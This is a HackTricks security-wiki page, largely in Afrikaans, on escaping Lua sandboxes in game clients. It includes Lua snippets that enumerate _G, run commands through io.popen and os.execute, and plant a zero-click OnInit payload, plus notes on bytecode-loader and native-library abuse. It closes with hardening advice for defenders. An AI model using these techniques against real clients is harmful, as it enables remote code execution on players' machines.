# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

This page versamel praktiese tegnieke om te enumereer en uit Lua "sandboxes" wat in toepassings ingebed is (veral: game clients, plugins, of in-app scripting engines) uit te breek. Baie engines openbaar 'n beperkte Lua-omgewing, maar laat kragtige globals bereikbaar wat arbitrêre opdraguitvoering of selfs native memory corruption moontlik maak wanneer bytecode loaders blootgestel word.

Key ideas:
- Behandel die VM as 'n onbekende omgewing: enumereer _G en ontdek watter gevaarlike primitiewe bereikbaar is.
- Wanneer stdout/print geblokkeer is, misbruik enige in-VM UI/IPC-kanaal as 'n output sink om resultate waar te neem.
- As io/os blootgestel is, het jy dikwels direkte command execution (io.popen, os.execute).
- As load/loadstring/loadfile blootgestel is, kan die uitvoering van vervaardigde Lua bytecode memory safety in sekere weergawes ondermyn (≤5.1 verifiers is bypassable; 5.2 het die verifier verwyder), wat gevorderde exploitation moontlik maak.

## Enumerate the sandboxed environment

- Dump die global environment om 'n inventaris te maak van bereikbare tables/functions:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- As print() nie beskikbaar is nie, hergebruik in-VM-kanale. Voorbeeld uit 'n MMO housing-skrip-VM waar chat-uitset slegs werk ná 'n sound call; die volgende bou 'n betroubare uitset-funksie:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Generaliseer hierdie patroon vir jou teiken: enige textbox, toast, logger of UI callback wat strings aanvaar kan as stdout dien vir reconnaissance.

## Direct command execution indien io/os blootgestel is

Indien die sandbox steeds die standaardbiblioteke io of os blootstel, het jy waarskynlik onmiddellike command execution:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Aantekeninge:
- Uitvoering vind binne die kliëntproses plaas; baie anti-cheat/antidebug-lae wat eksterne debuggers blokkeer, sal nie verhoed dat 'n proses binne die VM geskep word nie.
- Kyk ook na: package.loadlib (arbitrary DLL/.so loading), require with native modules, LuaJIT's ffi (if present), and the debug library (can raise privileges inside the VM).

## Zero-click triggers via auto-run callbacks

If the host application pushes scripts to clients and the VM exposes auto-run hooks (e.g., OnInit/OnLoad/OnEnter), place your payload there for drive-by compromise as soon as the script loads:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Enige ekwivalente callback (OnLoad, OnEnter, ens.) generaliseer hierdie tegniek wanneer skripte outomaties na die client oorgedra en daar uitgevoer word.

## Gevaarlike primitiewe om tydens recon na te jaag

Tydens _G-enumerasie, kyk spesifiek na:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: voer bronkode of bytecode uit; ondersteun die laai van onbetroubare bytecode.
- package, package.loadlib, require: dynamiese biblioteeklading en module-oppervlak.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, and hooks.
- LuaJIT-only: ffi.cdef, ffi.load om native kode direk aan te roep.

Minimale gebruiksvoorbeelde (indien bereikbaar):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Opsionele eskalasie: misbruik van Lua bytecode loaders

Wanneer load/loadstring/loadfile bereikbaar is maar io/os beperk is, kan die uitvoering van vervaardigde Lua bytecode lei tot geheue-onthulling en korruptie-primitiewe. Belangrike feite:
- Lua ≤ 5.1 het 'n bytecode verifier geverskaf wat bekende omseilings het.
- Lua 5.2 het die verifier heeltemal verwyder (amptelike standpunt: toepassings moet vooraf-gecompileerde chunks net verwerp), wat die aanvalsvlakte verbreed as bytecode loading nie verbied word nie.
- Tipiese werkvloei: leak pointers via in-VM output, vervaardig bytecode om type confusions te skep (bv. rondom FORLOOP of ander opcodes), en dan skuif na arbitrary read/write of native code execution.

Hierdie pad is engine/version-specific en vereis RE. Sien verwysings vir dieper ontledings, exploitation primitives, en voorbeeld-gadgetry in games.

## Opsporing en verhardingsnotas (vir verdedigers)

- Server side: verwerp of herskryf gebruikersskrips; allowlist veilige APIs; verwyder of bind-leeg io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: hardloop Lua met 'n minimale _ENV, verbied bytecode loading, herintroduceer 'n streng bytecode verifier of signature checks, en blokkeer process creation vanaf die kliëntproses.
- Telemetry: waarsku oor gameclient → child process creation kort nadat script gelaai is; korreleer met UI/chat/script-gebeure.

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
